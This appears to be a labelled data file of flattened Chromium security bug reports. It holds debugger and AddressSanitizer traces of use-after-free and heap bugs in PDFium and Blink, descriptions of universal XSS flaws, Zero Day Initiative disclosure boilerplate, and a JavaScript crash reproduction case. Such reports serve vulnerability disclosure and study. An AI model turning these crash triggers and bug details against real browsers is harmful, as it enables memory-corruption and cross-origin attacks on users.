call chrome_child opj_tgt_reset 5ef8c53e 5ef8e496 ff7324 push dword ptr ebx+24h 5ef8e499 e8a0e0ffff call chrome_child opj_tgt_reset 5ef8c53e 5ef8e49e 8b4314 mov eax dword ptr ebx+14h 5ef8e4a1 0faf4310 imul eax dword ptr ebx+10h 5ef8e4a5 59 pop ecx 5ef8e4a6 59 pop ecx 5ef8e4a7 8b4b18 mov ecx dword ptr ebx+18h 5ef8e4aa 85c0 test eax eax 5ef8e4ac 7410 je chrome_child opj_t2_read_packet_header 5ef8e4be 5ef8e4ae 83c130 add ecx,30h 5ef8e4b1 8361fc00 and dword ptr ecx-4 0 5ef8e4b5 832100 and dword ptr ecx 0 5ef8e4b8 8d4938 lea ecx ecx+38h 5ef8e4bb 48 dec eax 5ef8e4bc 75f3 jne chrome_child opj_t2_read_packet_header 5ef8e4b1 5ef8e4be 8b5514 mov edx dword ptr ebp+14h 5ef8e4c1 8b45dc mov eax dword ptr ebp-24h 5ef8e4c4 83c624 add esi,24h 5ef8e4c7 47 inc edi 5ef8e4c8 3b7818 cmp edi dword ptr eax+18h 5ef8e4cb 72ab jb chrome_child opj_t2_read_packet_header 5ef8e478 5ef8e4cd 8b7dfc mov edi dword ptr ebp-4 5ef8e4d0 8bf7 mov esi edi 5ef8e4d2 8b4510 mov eax dword ptr ebp+10h 5ef8e4d5 f60002 test byte ptr eax 2 5ef8e4d8 7435 je chrome_child opj_t2_read_packet_header 5ef8e50f 5ef8e4da 837d2406 cmp dword ptr ebp+24h 6 5ef8e4de 7307 jae chrome_child opj_t2_read_packet_header 5ef8e4e7 5ef8e4e0 68482fb75f push offset chrome_child string 5fb72f48 5ef8e4e5 eb1b jmp chrome_child opj_t2_read_packet_header 5ef8e502 2:036 r eax=00000001 ebx=08908000 ecx=00000000 edx=0da2cf18 esi=08904e94 edi=00000000 eip=5ef8e48e esp=0037ce74 ebp=0037ceb0 iopl=0 nv up ei pl nz na po nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010202 chrome_child opj_t2_read_packet_header 5ef8e48e ff7320 push dword ptr ebx+20h ds:0023:08908020 2:036 heap p a eb 2:036 heap p a ebx address 08908000 found in dph_heap_root 3b1000 in busy allocation dph_heap_block useraddr usersize virtaddr virtsize 87337b8 8907fd8 28 8907000 2000 6e6794ec verifier avrfdebugpageheapallocate 77c00dab ntdll rtldebugallocateheap 77bc1b4d ntdll rtlpallocateheap 77b5acde ntdll rtlallocateheap 5d8c1a0d chrome_child anonymous namespace win_heap_malloc 5d8c19e4 chrome_child malloc 5ef8aa52 chrome_child opj_tcd_init_decode_tile 5ef86059 chrome_child opj_j2k_read_tile_header 5ef8420d chrome_child opj_j2k_decode_tiles 5ef8480c chrome_child opj_j2k_exec 5ef83cb8 chrome_child opj_j2k_decode 5ef87cfc chrome_child opj_jp2_decode 5ef80e66 chrome_child opj_decode 5ef48590 chrome_child cjpx_decoder init 5ef4807b chrome_child ccodec_jpxmodule createdecoder 5ef37bc9 chrome_child cpdf_dibsource loadjpxbitmap 5ef363f4 chrome_child cpdf_dibsource createdecoder 5ef38598 chrome_child cpdf_dibsource startloaddibsource 5ef25158 chrome_child cpdf_imagecache startgetcachedbitmap 5ef251e1 chrome_child cpdf_pagerendercache startgetcachedbitmap 5ef383cb chrome_child cpdf_progressiveimageloaderhandle start 5ef386c4 chrome_child cpdf_imageloader startloadimage 5ef28cf2 chrome_child cpdf_imagerenderer startloaddibsource 5ef28792 chrome_child cpdf_imagerenderer start 5ef00b76 chrome_child cpdf_renderstatus continuesingleobject 5ef00a25 chrome_child cpdf_progressiverenderer continue 5eedd026 chrome_child fpdf_renderpage_retail 5eedf0ba chrome_child fpdf_renderpagebitmap_start 5e6f6834 chrome_child chrome_pdf pdfiumengine continuepaint 5e6fa786 chrome_child chrome_pdf pdfiumengine paint 5e700dc2 chrome_child chrome_pdf outofprocessinstance onpaint 5e705ae5 chrome_child paintmanager dopaint 2:036 lmvm chrome start end module name 011d0000 0129b000 chrome deferred image path chrome.exe image name chrome.exe timestamp fri nov 06 18:27:45 2015 563d61a1 checksum 000ce1db imagesize 000cb000 file version 46.0.2490.86 product version 46.0.2490.86 file flags 0 mask 17 file os 4 unknown win32 file type 1.0 app file date 00000000.00000000 translations 0409.04b0 companyname google inc productname google chrome internalname chrome_exe originalfilename chrome.exe productversion 46.0.2490.86 fileversion 46.0.2490.86 filedescription google chrome legalcopyright copyright 2015 google inc all rights reserved 2:036 lmvm chrome_child start end module name 5d8c0000 60193000 chrome_child private pdb symbols c code\symbols\chrome_child.dll.pdb\001f93f5fae74515bd40868fb342758e1\chrome_child.dll.pdb loaded symbol image file c program files\google\chrome\application\46.0.2490.86\chrome_child.dll image path c program files\google\chrome\application\46.0.2490.86\chrome_child.dll image name chrome_child.dll timestamp fri nov 06 18:26:08 2015 563d6140 checksum 0277c91a imagesize 028d3000 file version 46.0.2490.86 product version 46.0.2490.86 file flags 0 mask 17 file os 4 unknown win32 file type 1.0 app file date 00000000.00000000 translations 0409.04b0 companyname google inc productname google chrome internalname chrome_dll originalfilename chrome.dll productversion 46.0.2490.86 fileversion 46.0.2490.86 filedescription google chrome legalcopyright copyright 2015 google inc all rights reserved credit this vulnerability was discovered by anonymous working with hp s zero day initiative further details if supporting files were contained with this report they are provided within a password protected zip file the password is the zdi candidate number in the form zdi-can-xxxx where xxxx is the id number please confirm receipt of this report we expect all vendors to remediate zdi vulnerabilities within 120 days of the reported date if you are ready to release a patch at any point leading up the the deadline please coordinate with us so that we may release our advisory detailing the issue if the 120 day deadline is reached and no patch has been made available we will release a limited public advisory with our own mitigations so that the public can protect themselves in the absence of a patch please keep us updated regarding the status of this issue and feel free to contact us at any time zero day initiative zdi-disclosures hp.com the pgp key used for all zdi vendor communications is available from information about the zdi established by tippingpoint and acquired by hewlett-packard the zero day initiative zdi represents a best-of-breed model for rewarding security researchers for responsibly disclosing discovered vulnerabilities the zdi is unique in how the acquired vulnerability information is used the zdi does not re-sell the vulnerability details or any exploit code instead upon notifying the affected product vendor the zdi provides its hp tippingpoint customers with zero day protection through its intrusion prevention technology explicit details regarding the specifics of the vulnerability are not exposed to any parties until an official vendor patch is publicly available disclosure policy our vulnerability disclosure policy is available online at did this work before n/a chrome version 47.0.2526.106 channel stable os version flash version	7
security universal xss using widget updates in containernode parserremovechild vulnerability details there are 3 methods where containernode removebetween is invoked 1 containernode removechild 2 containernode parserremovechild 3 containernode removechildren the calls in 1 and 3 are within the scope of htmlframeownerelement updatesuspendscope but 2 is unprotected thus if the parser removes a plugin node with an associated widget plugins may take a while to load but it s easy to handle with document.write where the timing of parser actions can be arbitrarily controlled updates fired during the detachment can corrupt the dom tree version chrome 46.0.2490.86 stable chrome 47.0.2526.69 beta chrome 48.0.2564.10 dev chromium 49.0.2572.0 pepper flash release build compiled today	7
security universal xss using flash message loop vulnerability details from content/renderer/pepper/ppb_flash_message_loop_impl.cc int32_t ppb_flash_messageloop_impl internalrun const runfromhostproxycallback callback it is possible that the ppb_flash_messageloop_impl object has been destroyed when the nested message loop exits scoped_refptr state state_protector state base messageloop scopednestabletaskallower allow base messageloop current base messageloop current run ppb_flash_messageloop_impl internalrun does n't initialize a scopedpageloaddeferrer before spinning an event loop as a result cross-origin documents can be loaded at an arbitrary javascript execution point version chrome 47.0.2526.80 stable chrome 48.0.2564.41 beta chrome 49.0.2587.3 dev chromium 49.0.2591.0 pepper flash release build compiled today	11
security heap-use-after-free in blink nodeiteratorbase root vulnerability details the testcase crashes the latest asan build of chrome as follows 12700==error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 content_shell 0 in get third_party/webkit/source/wtf/refptr.h:59:43 1 in blink nodeiteratorbase root const third_party/webkit/source/core/dom/nodeiteratorbase.h:40 2 in blink nodeiterator updatefornoderemoval blink node blink nodeiterator nodepointer const third_party/webkit/source/core/dom/nodeiterator.cpp:152:37 3 in blink nodeiterator nodewillberemoved blink node third_party/webkit/source/core/dom/nodeiterator.cpp:142:5 4 in blink document nodechildrenwillberemoved blink containernode third_party/webkit/source/core/dom/document.cpp:3792:13 5 in blink containernode removechildren blink subtreemodificationaction third_party/webkit/source/core/dom/containernode.cpp:675:9 6 in blink imageinputtype setusefallbackcontent third_party/webkit/source/core/html/forms/imageinputtype.cpp:265:9 7 in blink imageinputtype ensurefallbackcontent third_party/webkit/source/core/html/forms/imageinputtype.cpp:253:5 8 in blink loadfallbackcontentforelement blink element third_party/webkit/source/core/html/htmlimageloader.cpp:66:9 9 in blink htmlimageloader noimageresourcetoload third_party/webkit/source/core/html/htmlimageloader.cpp:73:9 10 in blink imageloader doupdatefromelement blink imageloader bypassmainworldbehavior blink imageloader updatefromelementbehavior blink referrerpolicy third_party/webkit/source/core/loader/imageloader.cpp:356:9 11 in blink imageloader task run third_party/webkit/source/core/loader/imageloader.cpp:115:13 12 in blink microtaskfunctioncallback void third_party/webkit/source/core/dom/microtask.cpp:65:5 13 in v8 internal isolate runmicrotasks v8/src/isolate.cc:2692:9 14 in blink microtask performcheckpoint v8 isolate third_party/webkit/source/core/dom/microtask.cpp:52:9 15 in blink v8recursionscope didleavescriptcontext third_party/webkit/source/bindings/core/v8/v8recursionscope.cpp:39:5 16 in blink v8recursionscope v8recursionscope third_party/webkit/source/bindings/core/v8/v8recursionscope.h:75:13 17 in blink v8scriptrunner runcompiledscript v8 isolate v8 local v8 script blink executioncontext third_party/webkit/source/bindings/core/v8/v8scriptrunner.cpp:394:5 18 in blink scriptcontroller executescriptandreturnvalue v8 local v8 context blink scriptsourcecode const blink accesscontrolstatus double third_party/webkit/source/bindings/core/v8/scriptcontroller.cpp:189:21 19 in blink scriptcontroller evaluatescriptinmainworld blink scriptsourcecode const blink accesscontrolstatus blink scriptcontroller executescriptpolicy double third_party/webkit/source/bindings/core/v8/scriptcontroller.cpp:565:35 20 in blink scriptcontroller executescriptinmainworld blink scriptsourcecode const blink accesscontrolstatus double third_party/webkit/source/bindings/core/v8/scriptcontroller.cpp:538:5 21 in blink scriptloader executescript blink scriptsourcecode const double third_party/webkit/source/core/dom/scriptloader.cpp:421:5 22 in blink scriptloader preparescript wtf textposition const blink scriptloader legacytypesupport third_party/webkit/source/core/dom/scriptloader.cpp:272:14 23 in blink htmlscriptrunner runscript blink element wtf textposition const third_party/webkit/source/core/html/parser/htmlscriptrunner.cpp:352:9 24 in blink htmlscriptrunner execute wtf passrefptr blink element wtf textposition const third_party/webkit/source/core/html/parser/htmlscriptrunner.cpp:214:5 25 in blink htmldocumentparser runscriptsforpausedtreebuilder third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:330:9 26 in blink htmldocumentparser processparsedchunkfrombackgroundparser wtf passownptr blink htmldocumentparser parsedchunk third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:525:13 27 in blink htmldocumentparser pumppendingspeculations third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:586:36 28 in blink htmldocumentparser resumeparsingafteryield third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:319:5 29 in blink cancellabletaskfactory cancellabletask run third_party/webkit/source/platform/scheduler/cancellabletaskfactory.cpp:28:9 30 in base internal runnableadapter void scoped_ptr blink webtaskrunner task std 1 default_delete blink webtaskrunner task run scoped_ptr blink webtaskrunner task std 1 default_delete blink webtaskrunner task base/bind_internal.h:155:12 31 in base internal invokehelper false void base internal runnableadapter void scoped_ptr blink webtaskrunner task std 1 default_delete blink webtaskrunner task base internal typelist scoped_ptr blink webtaskrunner task std 1 default_delete blink webtaskrunner task makeitso base internal runnableadapter void scoped_ptr blink webtaskrunner task std 1 default_delete blink webtaskrunner task scoped_ptr blink webtaskrunner task std 1 default_delete blink webtaskrunner task base/bind_internal.h:295:5 32 in base internal invoker base indexsequence 0ul base internal bindstate base internal runnableadapter void scoped_ptr blink webtaskrunner task std 1 default_delete blink webtaskrunner task void scoped_ptr blink webtaskrunner task std 1 default_delete blink webtaskrunner task base internal passedwrapper scoped_ptr blink webtaskrunner task std 1 default_delete blink webtaskrunner task base internal typelist base internal unwraptraits base internal passedwrapper scoped_ptr blink webtaskrunner task std 1 default_delete blink webtaskrunner task base internal invokehelper false void base internal runnableadapter void scoped_ptr blink webtaskrunner task std 1 default_delete blink webtaskrunner task base internal typelist scoped_ptr blink webtaskrunner task std 1 default_delete blink webtaskrunner task void run base internal bindstatebase base/bind_internal.h:345:12 33 in base debug taskannotator runtask char const base pendingtask const base/debug/task_annotator.cc:51:3 34 in scheduler taskqueuemanager processtaskfromworkqueue scheduler internal workqueue scheduler internal taskqueueimpl task components/scheduler/base/task_queue_manager.cc:264:3 35 in scheduler taskqueuemanager dowork base timeticks bool components/scheduler/base/task_queue_manager.cc:180:13 36 in base internal invokehelper true void base internal runnableadapter void scheduler taskqueuemanager base timeticks bool base internal typelist base weakptr scheduler taskqueuemanager const base timeticks const bool const makeitso base internal runnableadapter void scheduler taskqueuemanager base timeticks bool base weakptr scheduler taskqueuemanager const base timeticks const bool const base/bind_internal.h:305:5 37 in base debug taskannotator runtask char const base pendingtask const base/debug/task_annotator.cc:51:3 38 in base messageloop runtask base pendingtask const base/message_loop/message_loop.cc:487:3 39 in base messageloop deferorrunpendingtask base pendingtask const base/message_loop/message_loop.cc:496:5 40 in base messageloop dowork base/message_loop/message_loop.cc:608:13 41 in base messagepumpdefault run base messagepump delegate base/message_loop/message_pump_default.cc:32:21 42 in base messageloop runhandler base/message_loop/message_loop.cc:451:3 43 in base runloop run base/run_loop.cc:55:3 44 in base messageloop run base/message_loop/message_loop.cc:289:3 45 in content renderermain content mainfunctionparams const content/renderer/renderer_main.cc:232:7 46 in content runzygote content mainfunctionparams const content contentmaindelegate content/app/content_main_runner.cc:307:14 47 in content runnamedprocesstypemain std 1 basic_string char std 1 char_traits char std 1 allocator char const content mainfunctionparams const content contentmaindelegate content/app/content_main_runner.cc:391:12 48 in content contentmainrunnerimpl run content/app/content_main_runner.cc:795:12 49 in content contentmain content contentmainparams const content/app/content_main.cc:19:15 50 in main content/shell/app/shell_main.cc:50:10 51 in libc_start_main build/buildd/glibc-2.21/csu/libc-start.c:289 is located 32 bytes inside of 88-byte region freed by thread t0 content_shell here 0 in interceptor_free home/nils/monkeychrome/oprealestate/asan-symbolized-linux-release-366905/content_shell 1 in wtf refcounted blink nodeiterator deref third_party/webkit/source/wtf/refcounted.h:176:13 2 in blink wrappertypeinfo derefobject blink scriptwrappable const third_party/webkit/source/bindings/core/v8/wrappertypeinfo.h:157:13 3 in v8 internal globalhandles pendingphantomcallback invoke v8 internal isolate v8/src/global-handles.cc:967:3 4 in v8 internal globalhandles invokesecondpassphantomcallbacks v8 internal list v8 internal globalhandles pendingphantomcallback v8 internal freestoreallocationpolicy v8 internal isolate v8/src/global-handles.cc:822:5 5 in v8 internal globalhandles dispatchpendingphantomcallbacks bool v8/src/global-handles.cc:941:7 6 in v8 internal globalhandles postgarbagecollectionprocessing v8 internal garbagecollector v8 gccallbackflags v8/src/global-handles.cc:988:18 7 in v8 internal heap performgarbagecollection v8 internal garbagecollector v8 gccallbackflags v8/src/heap/heap.cc:1300:9 8 in v8 internal heap collectgarbage v8 internal garbagecollector char const char const v8 gccallbackflags v8/src/heap/heap.cc:976:11 9 in v8 internal heap collectgarbage v8 internal allocationspace char const v8 gccallbackflags v8/src/heap/heap-inl.h:532:10 10 in v8 internal heap collectallgarbage int char const v8 gccallbackflags v8/src/heap/heap.cc:833:3 11 in v8 isolate requestgarbagecollectionfortesting v8 isolate garbagecollectiontype v8/src/api.cc:7140:5 12 in v8 internal functioncallbackarguments call void v8 functioncallbackinfo v8 value const v8/src/arguments.cc:33:3 13 in v8 internal maybehandle v8 internal object v8 internal anonymous namespace handleapicallhelper false v8 internal isolate v8 internal anonymous namespace builtinarguments v8 internal builtinextraarguments 1 v8/src/builtins.cc:2156:34 14 in v8 internal builtin_impl_handleapicall v8 internal anonymous namespace builtinarguments v8 internal builtinextraarguments 1 v8 internal isolate v8/src/builtins.cc:2180:3 15 in v8 internal builtin_handleapicall int v8 internal object v8 internal isolate v8/src/builtins.cc:2177:1 16 unknown module 17 unknown module 18 unknown module 19 unknown module 20 unknown module 21 in v8 internal anonymous namespace invoke v8 internal isolate bool v8 internal handle v8 internal object v8 internal handle v8 internal object int v8 internal handle v8 internal object v8 internal handle v8 internal object v8/src/execution.cc:98:13 22 in v8 internal execution call v8 internal isolate v8 internal handle v8 internal object v8 internal handle v8 internal object int v8 internal handle v8 internal object v8/src/execution.cc:164:10 23 in v8 script run v8 local v8 context v8/src/api.cc:1716:23 24 in blink v8scriptrunner runcompiledscript v8 isolate v8 local v8 script blink executioncontext third_party/webkit/source/bindings/core/v8/v8scriptrunner.cpp:392:18 25 in blink scriptcontroller executescriptandreturnvalue v8 local v8 context blink scriptsourcecode const blink accesscontrolstatus double third_party/webkit/source/bindings/core/v8/scriptcontroller.cpp:189:21 26 in blink scriptcontroller evaluatescriptinmainworld blink scriptsourcecode const blink accesscontrolstatus blink scriptcontroller executescriptpolicy double third_party/webkit/source/bindings/core/v8/scriptcontroller.cpp:565:35 27 in blink scriptcontroller executescriptinmainworld blink scriptsourcecode const blink accesscontrolstatus double third_party/webkit/source/bindings/core/v8/scriptcontroller.cpp:538:5 28 in blink scriptloader executescript blink scriptsourcecode const double third_party/webkit/source/core/dom/scriptloader.cpp:421:5 29 in blink scriptloader preparescript wtf textposition const blink scriptloader legacytypesupport third_party/webkit/source/core/dom/scriptloader.cpp:272:14 previously allocated by thread t0 content_shell here 0 in interceptor_malloc home/nils/monkeychrome/oprealestate/asan-symbolized-linux-release-366905/content_shell 1 in partitionallocgenericflags third_party/webkit/source/wtf/partitionalloc.h:736:20 2 in partitionallocgeneric third_party/webkit/source/wtf/partitionalloc.h:763 3 in wtf partitions fastmalloc unsigned long char const third_party/webkit/source/wtf/partitions.h:108 4 in blink nodeiterator create wtf passrefptr blink node unsigned int wtf passrefptr blink nodefilter third_party/webkit/source/core/dom/nodeiterator.h:45:35 5 in blink document createnodeiterator blink node unsigned int wtf passrefptr blink nodefilter third_party/webkit/source/core/dom/document.cpp:1469:12 6 in blink documentv8internal createnodeiteratormethod v8 functioncallbackinfo v8 value const mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release/gen/blink/bindings/core/v8/v8document.cpp:4433:44 7 in blink documentv8internal createnodeiteratormethodcallback v8 functioncallbackinfo v8 value const mnt/data/b/build/slave/asan_release__symbolized_/build/src/out/release/gen/blink/bindings/core/v8/v8document.cpp:4439:5 8 in v8 internal functioncallbackarguments call void v8 functioncallbackinfo v8 value const v8/src/arguments.cc:33:3 9 in v8 internal maybehandle v8 internal object v8 internal anonymous namespace handleapicallhelper false v8 internal isolate v8 internal anonymous namespace builtinarguments v8 internal builtinextraarguments 1 v8/src/builtins.cc:2156:34 10 in v8 internal builtin_impl_handleapicall v8 internal anonymous namespace builtinarguments v8 internal builtinextraarguments 1 v8 internal isolate v8/src/builtins.cc:2180:3 11 in v8 internal builtin_handleapicall int v8 internal object v8 internal isolate v8/src/builtins.cc:2177:1 12 unknown module 13 unknown module 14 unknown module 15 unknown module 16 unknown module 17 in v8 internal anonymous namespace invoke v8 internal isolate bool v8 internal handle v8 internal object v8 internal handle v8 internal object int v8 internal handle v8 internal object v8 internal handle v8 internal object v8/src/execution.cc:98:13 18 in v8 internal execution call v8 internal isolate v8 internal handle v8 internal object v8 internal handle v8 internal object int v8 internal handle v8 internal object v8/src/execution.cc:164:10 19 in v8 script run v8 local v8 context v8/src/api.cc:1716:23 20 in blink v8scriptrunner runcompiledscript v8 isolate v8 local v8 script blink executioncontext third_party/webkit/source/bindings/core/v8/v8scriptrunner.cpp:392:18 21 in blink scriptcontroller executescriptandreturnvalue v8 local v8 context blink scriptsourcecode const blink accesscontrolstatus double third_party/webkit/source/bindings/core/v8/scriptcontroller.cpp:189:21 22 in blink scriptcontroller evaluatescriptinmainworld blink scriptsourcecode const blink accesscontrolstatus blink scriptcontroller executescriptpolicy double third_party/webkit/source/bindings/core/v8/scriptcontroller.cpp:565:35 23 in blink scriptcontroller executescriptinmainworld blink scriptsourcecode const blink accesscontrolstatus double third_party/webkit/source/bindings/core/v8/scriptcontroller.cpp:538:5 24 in blink scriptloader executescript blink scriptsourcecode const double third_party/webkit/source/core/dom/scriptloader.cpp:421:5 25 in blink scriptloader preparescript wtf textposition const blink scriptloader legacytypesupport third_party/webkit/source/core/dom/scriptloader.cpp:272:14 26 in blink htmlscriptrunner runscript blink element wtf textposition const third_party/webkit/source/core/html/parser/htmlscriptrunner.cpp:352:9 27 in blink htmlscriptrunner execute wtf passrefptr blink element wtf textposition const third_party/webkit/source/core/html/parser/htmlscriptrunner.cpp:214:5 28 in blink htmldocumentparser runscriptsforpausedtreebuilder third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:330:9 29 in blink htmldocumentparser processparsedchunkfrombackgroundparser wtf passownptr blink htmldocumentparser parsedchunk third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:525:13 30 in blink htmldocumentparser pumppendingspeculations third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:586:36 31 in blink htmldocumentparser resumeparsingafteryield third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:319:5 summary addresssanitizer heap-use-after-free third_party/webkit/source/wtf/refptr.h:59:43 in get shadow bytes around the buggy address fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa 00 00 00 00 00 00 00 00 00 00 04 fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fa shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap right redzone fb freed heap region fd stack left redzone f1 stack mid redzone f2 stack right redzone f3 stack partial redzone f4 stack after return f5 stack use after scope f8 global redzone f9 global init order f6 poisoned by user f7 container overflow fc array cookie ac intra object redzone bb asan internal fe left alloca redzone ca right alloca redzone cb 12700==aborting version chrome version asan-symbolized-linux-release-366905 operating system linux 64-bit reproduction case requires js-flags expose-gc script function start o172=document.createelement a o390=document.createelement u try o172.insertadjacenthtml beforebegin catch e o461=document.importnode o172 true o390.appendchild o461 o390=null o893=o461.parentelement document.documentelement.appendchild o893 o910=document.createelement input o461.appendchild o910 o910.type='image document.execcommand inserthtml false o1050=document.createelement meta document.documentelement.innerhtml o1104=document.createelement table document.body.appendchild o1104 o1050.contenteditable=false o1189=document.createelement input o1104.appendchild o1189 o1050.setattribute dir rtl o1291=o1189.createshadowroot o1291.appendchild o1050 o1416=o1050.attributes 1 o1050.removeattribute o1416.name document.createnodeiterator o1416 487380955 o1559=document.createelement s o1716=document.implementation.createdocument null implementation.createdocument null o1724=document.createelement t o1716.appendchild o1724 o1716.appendchild document.replacechild o1716.documentelement document.documentelement gc start script for crashes please include the following additional information type of crash tab	11
security heap-use-after-free in blink scopedstyleresolver collectmatchingauthorrules vulnerability details the following testcase crashes the latest asan build of chrome as follows 389==error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 content_shell 0 in get third_party/webkit/source/wtf/refptr.h:60:43 1 in contents third_party/webkit/source/core/css/cssstylesheet.h:113 2 in blink scopedstyleresolver collectmatchingauthorrules blink elementrulecollector unsigned int third_party/webkit/source/core/css/resolver/scopedstyleresolver.cpp:151 3 in blink styleresolver matchauthorrules blink element blink elementrulecollector third_party/webkit/source/core/css/resolver/styleresolver.cpp:397:9 4 in blink styleresolver matchallrules blink styleresolverstate blink elementrulecollector bool third_party/webkit/source/core/css/resolver/styleresolver.cpp:454:5 5 in blink styleresolver styleforelement blink element blink computedstyle const blink stylesharingbehavior blink rulematchingbehavior third_party/webkit/source/core/css/resolver/styleresolver.cpp:637:9 6 in originalstyleforlayoutobject third_party/webkit/source/core/dom/element.cpp:1699:12 7 in blink element styleforlayoutobject third_party/webkit/source/core/dom/element.cpp:1675 8 in blink element recalcownstyle blink stylerecalcchange third_party/webkit/source/core/dom/element.cpp:1768:38 9 in blink element recalcstyle blink stylerecalcchange blink text third_party/webkit/source/core/dom/element.cpp:1723:22 10 in blink containernode recalcchildstyle blink stylerecalcchange third_party/webkit/source/core/dom/containernode.cpp:1323:17 11 in blink element recalcstyle blink stylerecalcchange blink text third_party/webkit/source/core/dom/element.cpp:1738:13 12 in blink document updatestyle blink stylerecalcchange third_party/webkit/source/core/dom/document.cpp:1839:13 13 in blink document updatelayouttree blink stylerecalcchange third_party/webkit/source/core/dom/document.cpp:1774:5 14 in updatelayouttreeifneeded third_party/webkit/source/core/dom/document.h:434:39 15 in blink frameview updatestyleandlayoutifneededrecursive third_party/webkit/source/core/frame/frameview.cpp:2524 16 in blink frameview updatelifecyclephasesinternal blink frameview lifecycleupdateoption third_party/webkit/source/core/frame/frameview.cpp:2395:5 17 in blink pageanimator updatelifecycletocompositingcleanplusscrolling blink localframe third_party/webkit/source/core/page/pageanimator.cpp:94:5 18 in blink webviewimpl updatealllifecyclephases third_party/webkit/source/web/webviewimpl.cpp:1920:5 19 in content renderwidgetcompositor updatelayertreehost content/renderer/gpu/render_widget_compositor.cc:869:3 20 in cc threadproxy beginmainframe scoped_ptr cc beginmainframeandcommitstate base defaultdeleter cc beginmainframeandcommitstate cc/trees/thread_proxy.cc:652:3 21 in run base/bind_internal.h:176:12 22 in base internal invokehelper true void base internal runnableadapter void cc proxymain scoped_ptr cc beginmainframeandcommitstate base defaultdeleter cc beginmainframeandcommitstate base internal typelist base weakptr cc proxymain const scoped_ptr cc beginmainframeandcommitstate base defaultdeleter cc beginmainframeandcommitstate makeitso base internal runnableadapter void cc proxymain scoped_ptr cc beginmainframeandcommitstate base defaultdeleter cc beginmainframeandcommitstate base weakptr cc proxymain const scoped_ptr cc beginmainframeandcommitstate base defaultdeleter cc beginmainframeandcommitstate base/bind_internal.h:303 23 in base internal invoker base indexsequence 0ul 1ul base internal bindstate base internal runnableadapter void cc proxymain scoped_ptr cc beginmainframeandcommitstate base defaultdeleter cc beginmainframeandcommitstate void cc proxymain scoped_ptr cc beginmainframeandcommitstate base defaultdeleter cc beginmainframeandcommitstate base internal typelist base weakptr cc proxymain base internal passedwrapper scoped_ptr cc beginmainframeandcommitstate base defaultdeleter cc beginmainframeandcommitstate base internal typelist base internal unwraptraits base weakptr cc proxymain base internal unwraptraits base internal passedwrapper scoped_ptr cc beginmainframeandcommitstate base defaultdeleter cc beginmainframeandcommitstate base internal invokehelper true void base internal runnableadapter void cc proxymain scoped_ptr cc beginmainframeandcommitstate base defaultdeleter cc beginmainframeandcommitstate base internal typelist base weakptr cc proxymain const scoped_ptr cc beginmainframeandcommitstate base defaultdeleter cc beginmainframeandcommitstate void run base internal bindstatebase base/bind_internal.h:343:12 24 in run base/callback.h:396:12 25 in base debug taskannotator runtask char const base pendingtask const base/debug/task_annotator.cc:51 26 in scheduler taskqueuemanager processtaskfromworkqueue scheduler internal taskqueueimpl scheduler internal taskqueueimpl task components/scheduler/base/task_queue_manager.cc:357:3 27 in scheduler taskqueuemanager dowork bool components/scheduler/base/task_queue_manager.cc:282:13 28 in run base/bind_internal.h:176:12 29 in makeitso base/bind_internal.h:303 30 in base internal invoker base indexsequence 0ul 1ul base internal bindstate base internal runnableadapter void scheduler taskqueuemanager bool void scheduler taskqueuemanager bool base internal typelist base weakptr scheduler taskqueuemanager bool base internal typelist base internal unwraptraits base weakptr scheduler taskqueuemanager base internal unwraptraits bool base internal invokehelper true void base internal runnableadapter void scheduler taskqueuemanager bool base internal typelist base weakptr scheduler taskqueuemanager const bool const void run base internal bindstatebase base/bind_internal.h:343 31 in run base/callback.h:396:12 32 in base debug taskannotator runtask char const base pendingtask const base/debug/task_annotator.cc:51 33 in base messageloop runtask base pendingtask const base/message_loop/message_loop.cc:481:3 34 in deferorrunpendingtask base/message_loop/message_loop.cc:490:5 35 in base messageloop dowork base/message_loop/message_loop.cc:602 36 in base messagepumpdefault run base messagepump delegate base/message_loop/message_pump_default.cc:32:21 37 in base runloop run base/run_loop.cc:55:3 38 in base messageloop run base/message_loop/message_loop.cc:288:3 39 in content renderermain content mainfunctionparams const content/renderer/renderer_main.cc:211:7 40 in content runzygote content mainfunctionparams const content contentmaindelegate content/app/content_main_runner.cc:302:14 41 in content runnamedprocesstypemain std 1 basic_string char std 1 char_traits char std 1 allocator char const content mainfunctionparams const content contentmaindelegate content/app/content_main_runner.cc:386:12 42 in content contentmainrunnerimpl run content/app/content_main_runner.cc:804:12 43 in content contentmain content contentmainparams const content/app/content_main.cc:19:15 44 in main content/shell/app/shell_main.cc:49:10 45 in libc_start_main build/buildd/glibc-2.21/csu/libc-start.c:289 is located 24 bytes inside of 128-byte region freed by thread t0 content_shell here 0 in interceptor_free home/nils/fuzzer3/runner/asan-linux-release-359663/content_shell 1 in deref third_party/webkit/source/wtf/refcounted.h:172:13 2 in derefifnotnull blink stylesheet third_party/webkit/source/wtf/passrefptr.h:55 3 in refptr third_party/webkit/source/wtf/refptr.h:58 4 in blink styleelement removedfrom blink element blink containernode third_party/webkit/source/core/dom/styleelement.cpp:111 5 in blink containernode notifynoderemoved blink node third_party/webkit/source/core/dom/containernode.cpp:860:9 6 in blink containernode removechild wtf passrefptr blink node blink exceptionstate third_party/webkit/source/core/dom/containernode.cpp:594:9 7 in 